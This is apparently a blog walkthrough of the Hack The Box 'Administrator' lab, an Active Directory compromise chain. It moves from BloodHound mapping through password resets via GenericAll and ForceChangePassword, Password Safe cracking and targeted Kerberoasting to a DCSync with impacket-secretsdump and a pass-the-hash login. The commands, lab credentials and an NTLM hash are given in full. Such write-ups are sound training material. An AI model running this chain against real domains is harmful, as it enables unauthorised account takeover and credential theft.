---
title: "Administrator - Hack The Box"
date: 2025-04-29T00:05:30-04:00
draft: false
toc: true
displayUpdatedDate: true
enableInlineShortcodes: true
layout: list
---

![Administrator Logo](/assets/images/HTB/Administrator/Administrator-LOGO.png)

This Medium-rated Windows machine on Hack The Box focuses on the exploitation of Active Directory weaknesses. Starting with user credentials, we use Bloodhound to map the domain and identify exploitable `GenericAll` permissions, which allows for a password reset using tools like `net rpc`. The investigation then uncovers an FTP server with a PasswordSafe file. Cracking this file provides credentials to exploit ForceChangePassword privileges and perform a targeted Kerberoast attack, leading to a full `DCSync` via Impacket for domain dominance.

{{< callout type="info" >}}
  Tags:

{{% details title="show tags"  closed="true" %}}
  - Windows
  - Active Directory 
  - Bloodhound
  - GenericAll
  - FTP
  - ForceChangePassword
  - psafe3
  - passwordsafe
{{% /details %}}
{{< /callout >}}


## Enumeration
{{< callout type="warning" >}}
**User Credentials!**

The following information was provided by Hack The Box:
```
As is common in real-life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich
```

- **Username:** Olivia
- **Password:** ichliebedich
{{< /callout >}}

As always, let's start by enumerating the target with the help of Nmap.
```bash
sudo nmap -sS -sV -sC -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,58289,61803,61807,61809,61831,61864 -Pn -n -vvv -oA nmap/allPorts 10.10.11.42
```

### Port Scan
```bash
# Nmap 7.95 scan initiated Wed Apr  2 12:09:36 2025 as: /usr/lib/nmap/nmap -sS -sV -sC -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,58289,61803,61807,61809,61831,61864 -Pn -n -vvv -oA nmap/allPorts 10.10.11.42
Nmap scan report for 10.10.11.42
Host is up, received user-set (0.068s latency).
Scanned at 2025-04-02 12:09:37 EDT for 74s

PORT      STATE SERVICE         REASON          VERSION
21/tcp    open  ftp             syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain          syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec    syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-02 19:09:45Z)
135/tcp   open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn     syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap            syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?   syn-ack ttl 127
464/tcp   open  kpasswd5?       syn-ack ttl 127
593/tcp   open  ncacn_http      syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped      syn-ack ttl 127
3268/tcp  open  ldap            syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped      syn-ack ttl 127
5985/tcp  open  http            syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf          syn-ack ttl 127 .NET Message Framing
47001/tcp open  http            syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
58289/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
61803/tcp open  ncacn_http      syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
61807/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
61809/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
61831/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
61864/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-02T19:10:45
|_  start_date: N/A
|_clock-skew: 3h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35406/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 29600/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 52617/udp): CLEAN (Failed to receive data)
|   Check 4 (port 61528/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

From the scan, I find various services running, including FTP (port 21), DNS (port 53), Kerberos (port 88), SMB (ports 135, 139, 445), and WinRM (port 5985), among others. Using Olivia's credentials, we can access the machine with WinRM, but there is no information on the machine that leads to a possible privilege escalation path. As I mentioned before, this is a pure AD machine.

### Running Bloodhound as Olivia 

Since this is an Active Directory environment and we have credentials, we run **Bloodhound-python** to gather information about the domain and find possible lateral movement paths.

```bash
bloodhound-python -u 'olivia' -p 'ichliebedich' -ns 10.10.11.42 -d administrator.htb -c all --zip
```

After uploading the data to Bloodhound, I set Olivia's user as "owned" and can see that Olivia has `GenericAll` rights over the user `Michael`.

![Bloodhound GenericAll Rights](/assets/images/HTB/Administrator/Admin1.png)

## Foothold

### GenericAll over Michael

In simple terms, `GenericAll` rights give full control of the object (user, computer, group, etc.), allowing the trustee to manipulate the target. In this case, I will use Olivia's credentials to abuse the `GenericAll` privilege and change Michael's password.

- For more information on GenericAll, please visit [SpectreOps - Generic All](https://bloodhound.specterops.io/resources/edges/generic-all)

```bash
net rpc password "michael" "wzk123." -U "administrator.htb"/"olivia"%"ichliebedich" -S "10.10.11.42"
```

Verify the password change was successful:

![Verifying Password Change](/assets/images/HTB/Administrator/Admin2.png)

### ForceChangePassword over Benjamin

I mark Michael as owned in Bloodhound and, upon investigating the user, I notice he has `ForceChangePassword` rights over Benjamin.

- For more information on ForceChangePassword, please visit [SpectreOps - ForceChangePassword](https://bloodhound.specterops.io/resources/edges/force-change-password)

![ForceChangePassword Rights](/assets/images/HTB/Administrator/Admin3.png)

This privilege, as its name implies, allows us to reset the password of the target user without knowing their current password.

```bash
net rpc password "benjamin" "wzk123." -U "administrator"/"michael"%"wzk123." -S "10.10.11.42"
```

Verify the password change was successful:

![Verifying Password Change](/assets/images/HTB/Administrator/Admin4.png)


### FTP Access
From the previous enumeration, we noted that FTP does not accept anonymous login. Since Bloodhound did not show more options for lateral movement, I decided to check the open services with the two new users I compromised.

```bash
ftp 10.10.11.42
# user: benjamin
# pass: wzk123.
```

Using the new credentials I set for Benjamin, I can access the FTP server and find a `.psafe3` file.

![FTP Share Access](/assets/images/HTB/Administrator/Admin5.png)

## PasswordSafe3 File

### Extracting & Cracking psafe Hash
Password Safe 3 (`.psafe3`) files are from a credential manager application similar to KeePass. In this case, we need to crack the password protecting the file. For this, I will use John the Ripper. Using `pwsafe2john`, I extract the hash from the file in a format that John can understand.


```bash
pwsafe2john Backup.psafe3 > Backup_hash
```
![Psafe3 Hash Extraction](/assets/images/HTB/Administrator/Admin6.png)

Now with the hash file in the correct format, I can crack the `.psafe3` file's password.

```bash
john Backup_hash --wordlist=/usr/share/wordlists/rockyou.txt
```
![John Cracking Hash](/assets/images/HTB/Administrator/Admin7.png)


- `tekieromucho`

Upon entering the correct password, I was able to open the backup file and retrieve three encrypted passwords.
### Checking .psafe3 content
- Download PasswordSafe for Linux [here](https://github.com/pwsafe/pwsafe/blob/master/README.LINUX.md).

![Open Psafe3 Backup](/assets/images/HTB/Administrator/Admin8.png)


| **USER**  | **PASSWORD**                   |
|-----------|--------------------------------|
| emily     | UXLCI5iETUsIBoFVTj8yQFKoHjXmb   |
| emma      | WwANQWnmJnGV07WQN8bMS7FMAbjNur |
| alexander | UrkIbagoxMyUGw0aPlj9B0AXSea4Sw |

Emily's credentials are valid. 

```bash
crackmapexec winrm 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

I log in via WinRM using Emily's credentials and get the `user.txt` flag.

![User Flag](/assets/images/HTB/Administrator/Admin9.png)

## Targeted Kerberoast

Using BloodHound, I mark Emily as "owned" and see that Emily has the ability to perform a Targeted Kerberoast attack against **Ethan**.
![Emily Bloodhound Path](/assets/images/HTB/Administrator/Admin10.png)


#### What is a targeted Kerberoast attack?

A Targeted Kerberoasting attack is a technique that allows an attacker (with a compromised account) that has `GenericAll`, `GenericWrite`, `WriteProperty`, or `Validated-SPN` permissions over another object to control multiple attributes of the target object, such as its SPNs (Service Principal Names).

Adding a non-existent SPN to the user allows the attacker to request a service ticket (ST) for that user. From here, it becomes a regular Kerberoasting attack. Requesting the new SPN will return a hash containing the user's password hash.

### Performing The Attack

I attempt to attach a non-existent SPN to Ethan with `targetedKerberoast.py`.

```bash
python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' 
```

![Targeted Kerberoast Attack](/assets/images/HTB/Administrator/Admin11.png).

Using Hashcat, I am able to crack the password for **Ethan**.

```bash
hashcat -m 13100 ethan_hash /usr/share/wordlists/rockyou.txt --force 
```
![Cracking Ethan's Hash](/assets/images/HTB/Administrator/Admin12.png).

- `ethan:limpbizkit`

## DCSync Attack

With CrackMapExec, I verify if the new credentials are valid.

```bash
crackmapexec smb 10.10.11.42 -u ethan -p limpbizkit --shares
```

![CrackMapExec with Ethan's credentials](/assets/images/HTB/Administrator/Admin13.png).


By checking Bloodhound and seeking possible attack paths, I find that Ethan has **DCSync** privileges over the domain. A *DCSync attack* allows an attacker to mimic a legitimate Domain Controller (DC) for the purpose of retrieving password data from the Active Directory environment. The attacker essentially tricks a DC into replicating password hashes, including the highly valuable KRBTGT hash, without needing a foothold on the DC itself. 

![Bloodhound Path for Ethan](/assets/images/HTB/Administrator/Admin14.png).

```bash
impacket-secretsdump 'administrator.htb'/'ethan':'limpbizkit'@10.10.11.42
```

![Secrets Dump](/assets/images/HTB/Administrator/Admin15.png).


Using the Administrator's NTLM hash, I can log in with `evil-winrm` to get the root flag.

```bash
evil-winrm -i 10.10.11.42 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
```



## References
- https://bloodhound.specterops.io/resources/edges/generic-all
- https://bloodhound.specterops.io/resources/edges/force-change-password
- https://blog.netwrix.com/2021/11/30/what-is-dcsync-an-introduction/
- https://trustmarque.com/resources/what-is-targeted-keberoasting/
- https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting 
- https://www.semperis.com/blog/dcsync-attack/